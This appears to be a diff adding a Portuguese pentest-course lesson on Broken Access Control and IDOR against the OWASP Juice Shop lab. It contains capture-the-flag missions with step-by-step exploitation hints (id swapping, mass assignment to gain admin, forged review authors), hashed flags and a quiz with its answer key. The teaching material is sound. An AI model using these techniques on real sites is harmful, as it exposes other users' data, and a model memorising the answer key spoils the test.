@@ -1,0 +1,959 @@
+---
+slug: controle-de-acesso-e-idor
+track: trilha-4
+title: "Broken Access Control e IDOR"
+prerequisites: [web-por-dentro]
+lab: juice-shop
+tasks:
+  - slug: missao-1-carrinho-alheio
+    title: "Missão 1 — O carrinho dos outros (IDOR horizontal)"
+    type: flag
+    prompt: "Quantos carrinhos de OUTROS usuários você conseguiu ler trocando o id em /rest/basket/{id} e qual a soma de todas as quantidades de produtos somadas nesses carrinhos, no formato FLAG{carrinhos-soma}."
+    hint: "Seu próprio carrinho tem um número (o bid do seu token). Os carrinhos de id menor pertencem a outras pessoas. Percorra os ids a partir de 1 até o seu, com o SEU token, e para cada carrinho que responder com itens some os campos quantity. A flag é a contagem de carrinhos alheios lidos e a soma total das quantidades."
+    flag:
+      hash: "scrypt$16384$8$1$7888ba6e6a04e5163f4c991250b54d71dea1db1a7d5b6480a02d6d179eb2812f"
+      salt: "5626264fdfec2551dfc5664484408a5d"
+  - slug: missao-2-virar-admin
+    title: "Missão 2 — Virar admin no cadastro (escalonamento vertical)"
+    type: flag
+    prompt: "O papel (role) que o seu token passa a carregar depois de abusar do cadastro e quantas contas com esse papel JÁ existiam no sistema antes de você criar a sua, no formato FLAG{papel-quantidade}."
+    hint: "O endpoint de cadastro POST /api/Users confia nos campos que você manda. Tente mandar um campo role a mais. Depois faça login, decodifique o payload do token (Base64url) e leia o campo role. Para a contagem, liste os usuários e conte quantos já tinham esse papel sem contar a conta que você acabou de criar."
+    flag:
+      hash: "scrypt$16384$8$1$93874139678c595889bcecd26f5c971eefd4dc168f1c5f8fc76a9bac056c3837"
+      salt: "5fa8b4f917f16b4547060e471fb581d9"
+  - slug: missao-3-review-forjada
+    title: "Missão 3 — A review que não é sua (BAC de escrita)"
+    type: flag
+    prompt: "A key do desafio do Juice Shop que fica resolvido ao publicar uma avaliação de produto no nome de outra pessoa e a parte local (antes do @) do e-mail que você forjou como autor, no formato FLAG{key-autor}."
+    hint: "Ao enviar uma avaliação (PUT /rest/products/{id}/reviews) o corpo inclui um campo author que o servidor aceita sem conferir. Forje-o como admin@juice-sh.op. Depois consulte /api/Challenges e ache a key do desafio da categoria Broken Access Control que virou solved. A parte local do e-mail forjado é o que vem antes do @."
+    flag:
+      hash: "scrypt$16384$8$1$2f7c27f085199f0751c47149ef26bcae90c9927b37eea4a98efd368dadff380e"
+      salt: "03048886f079b71c89596cc5f4167996"
+  - slug: quiz-final
+    title: "Quiz — Broken Access Control e IDOR"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Qual a diferença entre autenticação (authentication) e controle de acesso (access control / authorization)?"
+        options:
+          - "São sinônimos; os dois descrevem o login"
+          - "Autenticação prova QUEM você é; o controle de acesso decide, a cada pedido, SE você pode acessar aquele objeto ou aquela função. Broken Access Control é falhar na segunda mesmo com a primeira correta"
+          - "Controle de acesso é feito no navegador e autenticação no servidor"
+          - "Controle de acesso só existe em aplicações com login"
+        answer: 1
+        explanation: "Autenticação responde 'quem é você?' (o 4.4); o controle de acesso responde 'você pode fazer ISTO?'. Quase todo IDOR acontece com o atacante perfeitamente autenticado: ele está logado como ele mesmo e só pede o recurso de outra pessoa. Confundir os dois leva a 'defender' o login e deixar a autorização aberta."
+      - question: "O que caracteriza um IDOR (Insecure Direct Object Reference)?"
+        options:
+          - "Uma senha fraca no banco de dados"
+          - "A aplicação expõe uma referência direta a um objeto (um id, um nome de arquivo) e decide o acesso só por ela existir, sem conferir se o objeto pertence a quem pediu. Trocar a referência alcança o objeto de outra pessoa"
+          - "Um erro de digitação na URL"
+          - "Um ataque que só funciona sem login"
+        answer: 1
+        explanation: "IDOR é a referência direta (o /basket/6) que o servidor honra sem checar posse. Não depende de estar deslogado — no USPS de 2018 todo atacante estava logado. A cura é a checagem de posse no servidor, não esconder ou embaralhar o id."
+      - question: "Escalonamento horizontal e vertical: qual a diferença?"
+        options:
+          - "Horizontal é mais perigoso que vertical, sempre"
+          - "Horizontal é alcançar outro usuário do MESMO nível (ver o carrinho de outro cliente); vertical é subir de nível (um cliente virar admin). São eixos diferentes do mesmo problema de autorização"
+          - "Horizontal acontece em HTTP e vertical em HTTPS"
+          - "Vertical é um tipo de brute force"
+        answer: 1
+        explanation: "Horizontal anda 'de lado' (mesmo privilégio, outra pessoa — a Missão 1); vertical sobe (mais privilégio — a Missão 2). A raiz é a mesma: o servidor não verifica, por pedido, se você pode acessar aquele objeto (horizontal) ou aquela função (vertical)."
+      - question: "No Juice Shop, com o seu token de cliente você pede GET /rest/basket/1 (o carrinho do admin) e recebe 200 com os dados. Por que a falha é de autorização e não de autenticação?"
+        options:
+          - "Porque o token está expirado"
+          - "Porque o token é válido e o servidor sabe que é você; ele só não confere se o carrinho 1 é SEU antes de devolvê-lo. A identidade está certa; a decisão de acesso é que falta"
+          - "Porque o carrinho 1 não tem dono"
+          - "Porque o HTTPS não foi usado"
+        answer: 1
+        explanation: "O 200 só vem porque o token é aceito (autenticação OK). O defeito é não comparar o dono do objeto com o usuário do token (autorização). Por isso a defesa é uma checagem de posse no servidor, não mexer no login."
+      - question: "Por que usar um UUID aleatório no lugar de um id sequencial (1, 2, 3...) NÃO resolve o IDOR por si só?"
+        options:
+          - "Porque UUIDs são lentos"
+          - "Porque o UUID só torna a referência mais difícil de adivinhar, mas se ele vazar (numa URL compartilhada, num log, numa resposta de API) o acesso continua liberado. A correção é checar posse no servidor, não esconder o identificador"
+          - "Porque UUIDs não funcionam em bancos SQL"
+          - "Porque o navegador não aceita UUID na URL"
+        answer: 1
+        explanation: "Trocar id por UUID é 'segurança por obscuridade': aumenta o custo de adivinhar, não fecha a porta. IDs vazam o tempo todo. Sem a checagem de posse, quem obtém o UUID acessa o objeto. UUID é defesa em profundidade, não a cura."
+      - question: "A Missão 2 vira admin mandando um campo role no cadastro. Que classe de falha é essa?"
+        options:
+          - "SQL injection"
+          - "Mass assignment: o servidor copia para o objeto do banco campos vindos do cliente que não deviam ser editáveis (como role), deixando o usuário definir o próprio privilégio"
+          - "Cross-site scripting"
+          - "Brute force"
+        answer: 1
+        explanation: "Mass assignment (ou atribuição em massa) é ligar cegamente o corpo da requisição aos campos do modelo. Campos sensíveis como role, isAdmin ou saldo precisam ficar fora dessa ligação (allowlist). É um escalonamento vertical servido pelo próprio cadastro."
+      - question: "A interface do Juice Shop esconde o botão de Administração para quem é cliente. Por que isso não protege a função de admin?"
+        options:
+          - "Porque o botão reaparece sozinho"
+          - "Porque esconder o botão é uma decisão do navegador, e o atacante ignora a interface: ele fala direto com a API (curl, Burp). Se o servidor não refaz a checagem de papel no endpoint, responde normalmente"
+          - "Porque o botão é só decorativo em qualquer site"
+          - "Porque o cliente não tem token"
+        answer: 1
+        explanation: "Controle de acesso no cliente é aparência: o cliente está sob controle do atacante. Alcançar a função direto pela URL/endpoint é forced browsing. A regra é impor a decisão no servidor, a cada requisição — o front pode só esconder por conveniência."
+      - question: "Qual defesa ataca a RAIZ do IDOR?"
+        options:
+          - "Trocar ids sequenciais por UUID"
+          - "Em cada endpoint que recebe um identificador de objeto, verificar NO SERVIDOR se o objeto pertence (ou é permitido) ao usuário do token, negando por padrão quando não for"
+          - "Esconder os ids do usuário na interface"
+          - "Registrar as tentativas em log"
+        answer: 1
+        explanation: "A raiz é a checagem de posse ausente; a cura é adicioná-la no servidor, por objeto e por requisição, com deny by default. UUID, esconder ids e logar são úteis como camadas, mas não substituem a verificação de autorização."
+      - question: "O que o OWASP API Security chama de BOLA (Broken Object Level Authorization) tem a ver com IDOR?"
+        options:
+          - "Nada, são assuntos diferentes"
+          - "É o mesmo problema visto em APIs: o endpoint recebe o id de um objeto e não verifica se o chamador pode acessá-lo. BOLA é o IDOR no vocabulário de API e é o risco nº 1 do OWASP API Security Top 10"
+          - "BOLA é um tipo de criptografia"
+          - "BOLA só acontece em GraphQL"
+        answer: 1
+        explanation: "BOLA é literalmente o IDOR das APIs: autorização ausente no nível do objeto. Como APIs expõem muitos endpoints por id, o problema fica ainda mais comum — por isso lidera o OWASP API Security Top 10. É o gancho para o módulo 4.9."
+      - question: "Broken Access Control é a categoria A01:2021 do OWASP Top 10. O que levou a OWASP a colocá-la em primeiro lugar?"
+        options:
+          - "Foi escolha aleatória"
+          - "Os dados: 94% das aplicações testadas tinham alguma forma de controle de acesso quebrado, e os 34 CWEs dessa categoria tiveram mais ocorrências que qualquer outra — por isso ela subiu da 5ª para a 1ª posição"
+          - "Porque é a falha mais difícil de explorar"
+          - "Porque só afeta aplicações antigas"
+        answer: 1
+        explanation: "A OWASP mediu: a categoria apareceu em 94% das aplicações testadas, com mais de 318 mil ocorrências — a maior incidência entre todas as categorias. Deixou de ser a 5ª (2017) e virou a 1ª (2021). Não é teoria: é a falha mais encontrada na prática."
+glossary:
+  - term: authentication
+    definition: "Autenticação: provar QUEM você é (apresentar uma credencial — senha, chave, token — que o sistema confere). Acontece no login e vem antes do controle de acesso, que decide o que você pode fazer depois de identificado."
+  - term: SPA
+    definition: "Single-Page Application (aplicação de página única): aplicação web em que um programa JavaScript roda no navegador e conversa com o servidor por uma API, atualizando a tela sem recarregar a página. O Juice Shop é uma SPA."
+  - term: broken access control
+    definition: "Controle de acesso quebrado: a família de falhas em que um usuário autenticado consegue acessar objetos ou funções que não deveria — por falta de verificação de autorização no servidor. É a categoria A01:2021 do OWASP Top 10, a mais encontrada na prática (94% das aplicações testadas)."
+  - term: access control
+    definition: "Controle de acesso (autorização): a decisão, tomada pelo sistema, de SE um usuário já identificado pode ver ou alterar um recurso ou executar uma função. Vem depois da autenticação (que decide QUEM é o usuário) e precisa ser imposta no servidor, a cada requisição."
+  - term: horizontal privilege escalation
+    definition: "Escalonamento horizontal de privilégio: acessar dados ou ações de OUTRO usuário do mesmo nível de permissão (um cliente lendo o carrinho de outro cliente). Anda 'de lado': mesmo privilégio, pessoa diferente."
+  - term: vertical privilege escalation
+    definition: "Escalonamento vertical de privilégio: subir para um nível de permissão maior do que o seu (um cliente comum passando a agir como administrador). Sobe de papel, alcançando funções que não são do seu perfil."
+  - term: function-level access control
+    definition: "Controle de acesso no nível de função: a verificação de que o usuário pode executar aquela OPERAÇÃO/endpoint (apagar um usuário, abrir o painel de admin), e não só acessar um objeto. Sua ausência é o Broken Function Level Authorization (BFLA) do OWASP API Security."
+  - term: BOLA
+    definition: "Broken Object Level Authorization: o IDOR no vocabulário de APIs — um endpoint recebe o id de um objeto e não verifica se o chamador pode acessá-lo. É o risco nº 1 do OWASP API Security Top 10."
+  - term: mass assignment
+    definition: "Mass assignment (atribuição em massa): ligar cegamente os campos do corpo de uma requisição aos campos de um objeto do banco, deixando o cliente definir campos sensíveis que não deveria (como role ou isAdmin). Permite, por exemplo, se cadastrar já como administrador."
+  - term: RBAC
+    definition: "Role-Based Access Control (controle de acesso baseado em papéis): modelo em que as permissões são atribuídas a papéis (admin, cliente, suporte) e os usuários recebem papéis. Centraliza a decisão de acesso em vez de espalhar verificações soltas pelo código."
+  - term: deny by default
+    definition: "Negar por padrão: a postura de recusar todo acesso que não tenha sido explicitamente permitido. Um recurso novo nasce fechado; abre-se o mínimo necessário. O oposto — liberar por padrão e tentar bloquear exceções — deixa buracos."
+  - term: principle of least privilege
+    definition: "Princípio do menor privilégio: dar a cada usuário, processo ou componente apenas as permissões necessárias para a sua função, e nada além. Limita o estrago quando uma conta é comprometida ou uma falha de acesso é explorada."
+  - term: parameter tampering
+    definition: "Parameter tampering (adulteração de parâmetro): alterar valores que o cliente controla — um id na URL, um campo no corpo, um valor escondido num formulário — para obter um acesso ou resultado não pretendido. A troca de id de um IDOR é um caso de parameter tampering."
+---
+
+import horizontalVsVertical from "./img/horizontal-vs-vertical.svg";
+import idorTrocaDeId from "./img/idor-troca-de-id.svg";
+import controleSoNoCliente from "./img/controle-so-no-cliente.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+No módulo anterior você quebrou a **autenticação**: fez o sistema acreditar que
+você era outra pessoa. Agora o jogo muda. Neste módulo você está perfeitamente
+logado — como você mesmo, com a sua conta de verdade — e ainda assim consegue
+ler o carrinho dos outros, virar administrador e publicar uma avaliação no nome
+de um estranho. A falha não está em **quem** o sistema acha que você é; está no
+que ele **deixa** você fazer depois de saber quem você é.
+
+Essa é a diferença entre autenticação e **controle de acesso** (access control,
+também chamado de autorização). A <GlossaryTerm term="authentication">autenticação</GlossaryTerm>
+responde "quem é você?"; o <GlossaryTerm term="access control">controle de
+acesso</GlossaryTerm> responde "você pode fazer **isto**?". Quando o sistema
+erra a segunda pergunta, temos um
+<GlossaryTerm term="broken access control">Broken Access Control</GlossaryTerm>
+(controle de acesso quebrado) — e, por incrível que pareça, essa é a falha mais
+encontrada na web. A OWASP a colocou em **primeiro lugar** no seu Top 10 de
+2021 (a categoria A01), justamente porque apareceu em 94% das aplicações que
+mediram.
+
+O caso particular mais famoso dessa família tem nome próprio: o
+<GlossaryTerm term="IDOR">IDOR</GlossaryTerm> (Insecure Direct Object
+Reference). É quando a aplicação deixa você apontar diretamente para um objeto
+— pelo seu número, pelo seu nome de arquivo — e o entrega sem conferir se ele é
+seu. Trocar um `1` por um `2` na URL e ver os dados de outra pessoa: simples
+assim, e vale centenas de milhões de registros no mundo real, como você verá.
+
+**O que você vai aprender:**
+
+- A diferença entre autenticação e autorização, e por que quase todo IDOR
+  acontece com o atacante **logado**.
+- O que é IDOR e as duas direções do controle de acesso quebrado:
+  <GlossaryTerm term="horizontal privilege escalation">escalonamento
+  horizontal</GlossaryTerm> (alcançar outro usuário do mesmo nível) e
+  <GlossaryTerm term="vertical privilege escalation">escalonamento
+  vertical</GlossaryTerm> (subir de nível, virar admin).
+- Como explorar, no Juice Shop, três falhas reais: ler carrinhos alheios por
+  IDOR, virar administrador abusando do cadastro
+  (<GlossaryTerm term="mass assignment">mass assignment</GlossaryTerm>) e forjar
+  uma avaliação no nome de outra pessoa.
+- Por que esconder um botão na interface **não** é controle de acesso, e o que
+  é <GlossaryTerm term="forced browsing">forced browsing</GlossaryTerm>.
+- Como se defende de verdade: <GlossaryTerm term="deny by default">negar por
+  padrão</GlossaryTerm>, checar posse e papel **no servidor** a cada
+  requisição, e o <GlossaryTerm term="principle of least privilege">princípio do
+  menor privilégio</GlossaryTerm>.
+
+**Pré-requisito relembrado.** Você precisa do módulo **4.1 (Como a web funciona
+por dentro)**: vamos falar o tempo todo de requisições HTTP, métodos (`GET`,
+`POST`, `PUT`), cabeçalhos e de como o cliente manda dados ao servidor. Se
+"trocar o id na URL" ou "mandar um campo a mais no corpo" soar estranho, revise
+o 4.1 antes.
+
+<Callout variant="warning" title="Só em ambiente autorizado">
+Tudo aqui é feito **exclusivamente** contra o laboratório local `juice-shop`,
+que existe para ser atacado. Trocar um id para ver o pedido de outra pessoa,
+num site real, é acesso não autorizado a sistema — crime no Brasil (art. 154-A
+do Código Penal, visto no 1.4). A técnica é a mesma; o que muda é a
+autorização. Pentest se faz com escopo e permissão por escrito.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 Autenticação você já tem; autorização é o próximo muro
+
+Imagine um hotel. A **autenticação** é a recepção conferir seu documento e
+confirmar que você é o hóspede Fulano: feito uma vez, no check-in. A
+**autorização** é o que acontece a cada porta: o seu cartão abre o **seu** quarto
+e a academia, mas não o quarto do vizinho nem o depósito. Autenticar é saber quem
+é; autorizar é decidir, **porta a porta**, o que aquela pessoa pode abrir.
+
+Broken Access Control é um hotel em que, depois do check-in, **qualquer** cartão
+abre **qualquer** porta — ou em que o número do quarto escrito no cartão é a
+única coisa que a fechadura olha, de modo que riscar "302" e escrever "301" abre
+a porta ao lado. O hóspede é legítimo; o controle de acesso é que não existe.
+
+Guarde a frase que vai reaparecer o módulo inteiro: **o atacante de um IDOR está
+logado**. Ele não burlou o login (isso foi o 4.4). Ele entrou pela porta da
+frente, com a própria conta, e então pediu um recurso que não é dele. Por isso
+"ter login" ou "exigir autenticação" **não** defende contra isto — os dois
+maiores vazamentos por IDOR da história, que você verá na seção 4, aconteceram
+um com usuários logados e outro sem login nenhum. O que faltava, nos dois, era a
+mesma coisa: conferir se o objeto pedido pertencia a quem pediu.
+
+### 2.2 As duas direções: horizontal e vertical
+
+O controle de acesso quebra em dois sentidos, e nomeá-los ajuda a diagnosticar.
+
+- **Escalonamento horizontal.** Você alcança um recurso de **outro usuário do
+  mesmo nível** que o seu. Dois clientes comuns: um lê o carrinho, os pedidos ou
+  as mensagens do outro. Ninguém "subiu" de poder; andou-se de lado. É a Missão 1.
+- **Escalonamento vertical.** Você alcança um **nível de permissão maior**: de
+  cliente comum para administrador, de usuário para moderador. Ganha-se acesso a
+  funções que não são do seu perfil (apagar usuários, ver o painel de admin). É
+  a Missão 2.
+
+<Figure
+  src={horizontalVsVertical}
+  alt="Diagrama com dois eixos partindo do usuário comum autenticado, no canto inferior esquerdo. O eixo horizontal, para a direita, leva a outro cliente comum (ler o carrinho dele), rotulado escalonamento horizontal ou IDOR. O eixo vertical, para cima, leva ao administrador (virar admin no cadastro), rotulado escalonamento vertical. Uma caixa verde no centro explica que a raiz é a mesma nos dois eixos: o servidor autentica, sabe quem você é, mas não autoriza por objeto e por função, não conferindo a cada pedido se este usuário pode acessar este objeto ou esta função; a defesa é negar por padrão e checar posse e papel no servidor."
+  caption="Os dois eixos do controle de acesso quebrado. Horizontal: outra pessoa, mesmo nível. Vertical: nível maior. A raiz é idêntica — falta a verificação de autorização por objeto e por função, no servidor."
+/>
+
+A distinção importa para a defesa: a horizontal se resolve conferindo **posse**
+("este carrinho é seu?"); a vertical se resolve conferindo **papel** ("você é
+admin?"). As duas são checagens no servidor, mas olham coisas diferentes.
+
+### 2.3 IDOR por dentro: a referência direta ao objeto
+
+O nome assusta, mas a ideia é simples. Uma **referência direta a objeto** é um
+identificador que o cliente vê e manda de volta para apontar um dado: o `6` em
+`/rest/basket/6`, o nome `fatura-000123.pdf`, o `id=42` num formulário. Em si,
+isso não é ruim — toda aplicação usa identificadores.
+
+Ela vira **insegura** (o "I" de IDOR) quando o servidor decide o acesso **só
+porque a referência existe e é válida**, sem a pergunta que falta: *este objeto
+pertence a quem está pedindo?*. Aí, trocar a referência (um caso de
+<GlossaryTerm term="parameter tampering">parameter tampering</GlossaryTerm>)
+alcança o objeto de outra pessoa.
+
+<Figure
+  src={idorTrocaDeId}
+  alt="Diagrama de sequência entre o atacante, logado como usuário 25 e dono do carrinho 6, e o servidor. Primeiro pedido, legítimo: GET barra rest barra basket barra 6 com o token; o servidor confere que o token é válido e que o dono do carrinho 6 é o próprio atacante, as duas conferem, e responde 200 com o carrinho 6. Segundo pedido: o atacante troca só o número para GET barra rest barra basket barra 1 com o mesmo token; o servidor confere que o token é válido, pois o atacante está logado, mas ninguém compara o dono do carrinho 1, que é o admin, com o id do atacante, porque a checagem de posse não existe, e responde 200 com o carrinho 1 do admin. Uma faixa verde embaixo mostra a checagem que faltava, em uma linha: o dono do objeto pedido é igual ao usuário do token? Se não for, responder 403 ou 404, e nunca confiar no identificador vindo do cliente como prova de posse."
+  caption="O IDOR em duas requisições: o primeiro pedido é legítimo; o segundo só troca o número. O servidor valida o token (autenticação) mas nunca compara o dono do objeto com o usuário (autorização) — a checagem de posse ausente é o coração do IDOR."
+/>
+
+Repare no detalhe que engana muita gente: **UUIDs não curam IDOR**. Trocar
+`/basket/1` por `/basket/9f3c…` só torna a referência mais difícil de
+**adivinhar**. Mas identificadores vazam o tempo todo — numa URL compartilhada,
+num log, no corpo de outra resposta de API. Se o UUID vazar e a checagem de posse
+não existir, o acesso continua liberado. Embaralhar o id é **segurança por
+obscuridade**: uma camada, nunca a cura.
+
+### 2.4 Controle de acesso no cliente é decoração
+
+Uma aplicação moderna como o Juice Shop é uma <GlossaryTerm term="SPA">SPA</GlossaryTerm>
+(single-page application): um programa JavaScript que roda no **seu** navegador e
+conversa com o servidor por uma API. É tentador — e comum — o front-end decidir o
+que mostrar com base no seu papel: "se não é admin, esconda o botão de
+Administração". O problema é que isso roda **no cliente**, e o cliente é do
+atacante.
+
+Esconder o botão não tranca a porta; só tira a maçaneta da vista. O atacante
+ignora a interface e fala **direto** com a API — com `curl`, com o Burp, com um
+script. Se o endpoint do servidor não **refaz** a verificação de papel, ele
+responde normalmente. Alcançar assim uma função que a interface não te oferece é
+o <GlossaryTerm term="forced browsing">forced browsing</GlossaryTerm>.
+
+<Figure
+  src={controleSoNoCliente}
+  alt="Diagrama com dois caminhos até uma função de administrador. No caminho de cima, o navegador do cliente roda a regra se o papel não é admin então esconder o botão Admin; a decisão roda no cliente e só omite a opção, é aparência e não barreira; ao lado, o servidor e a API respondem a quem pedir se não refizerem a checagem de papel. No caminho de baixo, o atacante ignora a interface e usa curl com o cabeçalho Authorization Bearer para pedir http barra alvo barra api barra Users direto ao servidor; como o endpoint não refaz a verificação de papel, o servidor responde 200 com dados privilegiados, o que é forced browsing. Uma faixa verde embaixo resume que toda decisão de acesso é tomada e imposta no servidor, a cada requisição, e que o front-end pode esconder o botão por conveniência, mas isso nunca substitui a checagem no servidor."
+  caption="O botão escondido não protege nada: o atacante fala direto com a API. Toda decisão de acesso tem de ser imposta no servidor, a cada requisição."
+/>
+
+### 2.5 A mesma falha em API: BOLA e BFLA
+
+Quando o alvo é uma API — como a do Juice Shop, e como quase tudo hoje —, essas
+falhas ganham os nomes do **OWASP API Security Top 10**. O IDOR vira
+<GlossaryTerm term="BOLA">BOLA</GlossaryTerm> (Broken Object Level
+Authorization): um endpoint recebe o id de um objeto e não verifica se o
+chamador pode acessá-lo — e é o risco **número 1** dessa lista. A falha de
+função (esconder só no cliente) vira
+<GlossaryTerm term="function-level access control">BFLA</GlossaryTerm> (Broken
+Function Level Authorization). São os mesmos conceitos desta aula, e o gancho
+direto para o módulo **4.9 (Segurança de APIs e GraphQL)**.
+
+## 3. Como o ataque funciona — a mecânica
+
+A metodologia do controle de acesso quebrado é quase sempre a mesma, e cabe em
+três passos. Todos os comandos rodam de dentro do Kali, a única máquina que
+alcança o alvo em `http://juice-shop:3000/`.
+
+### 3.1 Passo 1 — mapear os objetos e as referências
+
+Primeiro você navega a aplicação **como um usuário normal** e observa o que o
+cliente manda ao servidor. Cada vez que uma tela carrega "a sua" coisa — o seu
+carrinho, o seu perfil, o seu pedido —, repare na requisição: quase sempre há
+uma referência direta ali (`/basket/6`, `?id=25`, um campo no corpo). Essas
+referências são os candidatos a IDOR.
+
+No Juice Shop, ao logar, o servidor devolve um **token** que você reapresenta a
+cada pedido no cabeçalho `Authorization: Bearer <token>` — um
+<GlossaryTerm term="Bearer token">Bearer token</GlossaryTerm>. Esse token é um
+<GlossaryTerm term="JWT">JWT</GlossaryTerm>, e o seu conteúdo é legível (veremos
+na Missão 2). Dentro dele vai, entre outras coisas, o número do **seu** carrinho
+(o campo `bid`). Essa é a sua referência legítima — e o ponto de partida para
+testar as dos outros.
+
+### 3.2 Passo 2 — trocar a referência e observar a resposta
+
+Aqui mora o ataque. Você pega uma referência que é sua e a **troca** por outra:
+o id vizinho, o id `1`, um intervalo inteiro. Depois **lê a resposta** e a
+classifica:
+
+- **200 com dados de outra pessoa** → IDOR confirmado (horizontal).
+- **403 Forbidden** → o servidor checou e negou. Bom sinal de defesa — mas
+  cuidado (seção 7): às vezes o 403 vem só da interface, e o endpoint real está
+  aberto.
+- **404 Not Found** → ou o objeto não existe, ou o servidor esconde a existência
+  (uma defesa válida é responder 404 em vez de 403, para não confirmar que o
+  objeto existe).
+
+Para funções (escalonamento vertical) o teste é parecido, mas em vez de trocar o
+id de um objeto você tenta **executar a operação** que não deveria: chamar o
+endpoint de admin, mandar um campo `role` no cadastro, usar o método HTTP que a
+interface não oferece.
+
+### 3.3 Passo 3 — confirmar o impacto
+
+Um IDOR só "vale" pelo que ele alcança. Ler o carrinho de um estranho é leve;
+ler o extrato bancário dele (como no First American) é catastrófico. A terceira
+etapa é demonstrar o impacto de forma responsável: no lab, isso é pegar a flag;
+num engajamento real, é documentar o acesso com uma prova mínima e **parar** —
+sem baixar dados de terceiros além do necessário para provar a falha (ética do
+1.4).
+
+<Callout variant="info" title="GET lê, mas PUT/POST/DELETE alteram">
+Um erro clássico é testar IDOR só com `GET` (leitura). Muitas falhas graves
+estão nos outros métodos: um `PUT` que edita o perfil de outro usuário, um
+`DELETE` que apaga o recurso alheio, um `POST` que escreve no nome de outra
+pessoa (a sua Missão 3). O mesmo endpoint pode conferir posse no `GET` e
+esquecer no `PUT`. Teste os verbos, um a um.
+</Callout>
+
+## 4. Casos reais — o que aconteceu no mundo
+
+Broken Access Control não é falha de laboratório: é a nº 1 do OWASP justamente
+porque explode no mundo real, em escala de centenas de milhões de registros. Dois
+casos, verificados em fonte primária, mostram as duas faces — com login e sem
+login.
+
+### USPS: 60 milhões de contas, qualquer usuário logado via as dos outros (novembro de 2018)
+
+Em **21 de novembro de 2018**, o jornalista Brian Krebs revelou uma falha no site
+dos Correios dos Estados Unidos (USPS). Uma API do programa "Informed Visibility",
+feita para clientes empresariais acompanharem correspondência, aceitava consultas
+com curingas e **não verificava se quem pedia tinha permissão sobre os dados
+pedidos**. Nas palavras do relato, a falha permitia que *"qualquer usuário logado
+no usps.com consultasse o sistema por detalhes de conta pertencentes a quaisquer
+outros usuários"*.
+
+Isto é escalonamento **horizontal** em escala industrial: todo atacante estava
+**autenticado** — logado com a própria conta —, o que mostra que exigir login não
+é controle de acesso. Dava para extrair e-mail, nome de usuário, número de conta,
+endereço, telefone e dados de campanhas de **cerca de 60 milhões** de contas. Pior:
+um pesquisador havia avisado os Correios mais de um ano antes, sem resposta; só
+depois do contato de Krebs a falha foi corrigida, em **20 de novembro de 2018**.
+
+- **Lição:** autenticação não é autorização. A única "defesa" presente era exigir
+  estar logado — e isso nunca basta. Fonte primária:
+  [KrebsOnSecurity, 21/11/2018](https://krebsonsecurity.com/2018/11/usps-site-exposed-data-on-60-million-users/).
+
+### First American: 885 milhões de documentos, um dígito na URL (maio de 2019)
+
+Em **24 de maio de 2019**, Krebs revelou um caso ainda maior e do outro tipo. A
+First American Financial, gigante americana de seguro de títulos imobiliários,
+servia documentos de transações em URLs com um **número sequencial**. O
+desenvolvedor imobiliário Ben Shoval percebeu que, ao alterar esse número, via o
+documento de **outra** transação — e sem precisar de login algum:
+*"qualquer um que soubesse a URL de um documento válido no site podia ver outros
+documentos apenas mudando um único dígito no link"*.
+
+Era um **IDOR puro, não autenticado**. O documento de número mais antigo,
+`000000075`, apontava para uma transação de **2003**; incrementando o número, os
+documentos chegavam até o presente. Ao todo, cerca de **885 milhões** de arquivos
+— números de Seguridade Social, extratos bancários, recibos de transferência e
+fotos de carteiras de motorista — ficaram acessíveis. A empresa tirou o site do ar
+por volta das 14h (horário do leste dos EUA) do mesmo 24 de maio, após o aviso.
+
+- **Lição:** a referência direta (o número do documento) sem checagem de acesso é
+  o IDOR em estado puro; trocar id por um valor "não adivinhável" não teria
+  salvado — a URL válida bastava. Fonte primária:
+  [KrebsOnSecurity, 24/05/2019](https://krebsonsecurity.com/2019/05/first-american-financial-corp-leaked-hundreds-of-millions-of-title-insurance-records/).
+
+Os dois juntos dizem tudo: a falha é a mesma (acesso sem checagem de posse), com
+login (USPS) ou sem (First American), e o preço é medido em centenas de milhões
+de pessoas. É por isso que a OWASP, no seu [Top 10 de 2021](https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/),
+promoveu o Broken Access Control da 5ª para a **1ª** posição: ela apareceu em
+**94%** das aplicações testadas, com mais de 318 mil ocorrências — a maior
+incidência de todas as categorias.
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá (1) lido os carrinhos de outros usuários por
+IDOR horizontal, (2) virado administrador abusando do cadastro (escalonamento
+vertical por mass assignment) e (3) publicado uma avaliação de produto no nome de
+outra pessoa (BAC de escrita). Cada missão rende uma flag.
+
+O laboratório é o **`juice-shop`**: o Kali e o OWASP Juice Shop, uma loja de sucos
+deliberadamente vulnerável mantida pela OWASP, na mesma rede interna. De dentro do
+Kali, o alvo responde em `http://juice-shop:3000/`. Você trabalha pelo terminal do
+Kali, com `curl` e `python3` — o que a attack box já traz.
+
+<Callout variant="warning" title="Um laboratório por vez">
+Este lab sobe o Kali e o Juice Shop. Se outro lab estiver no ar, o botão vira
+**Trocar para este lab**. Feche o que não estiver usando antes de subir.
+</Callout>
+
+### 5.1 Subir o lab e preparar a bancada (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. Se a
+   plataforma avisar que faltam imagens, rode no terminal do WSL
+   `scripts/lab.sh pull juice-shop` (único momento com internet) e tente de novo.
+   Pela linha de comando, a alternativa para ligar é `scripts/lab.sh up juice-shop`.
+2. Quando o desktop do Kali aparecer, clique nele, abra um terminal e crie a pasta
+   de evidências:
+
+```console
+$ umask 077
+$ mkdir -p ~/engajamentos/lab-4.5_juice-shop/evidencias
+$ cd ~/engajamentos/lab-4.5_juice-shop/evidencias
+```
+
+3. Confirme que o alvo responde e anote a versão (parte do seu registro de
+   evidências):
+
+```console
+$ curl -s http://juice-shop:3000/rest/admin/application-version
+{"version":"20.2.0"}
+```
+
+### 5.2 A carta de autorização do exercício
+
+<Callout variant="info" title="Autorização — exercício 4.5 (laboratório local)">
+**Ativo autorizado:** a aplicação `http://juice-shop:3000/` do lab `juice-shop`.
+
+**Técnicas autorizadas:** leitura de objetos de outros usuários por IDOR,
+escalonamento de privilégio por mass assignment no cadastro e escrita de avaliação
+com autor forjado, tudo contra o Juice Shop, pelo terminal do Kali.
+
+**Fora do escopo:** qualquer outro host (o `guacd`, o próprio Kali) e qualquer
+sistema fora do laboratório. Nada de testar estas técnicas em sites reais.
+</Callout>
+
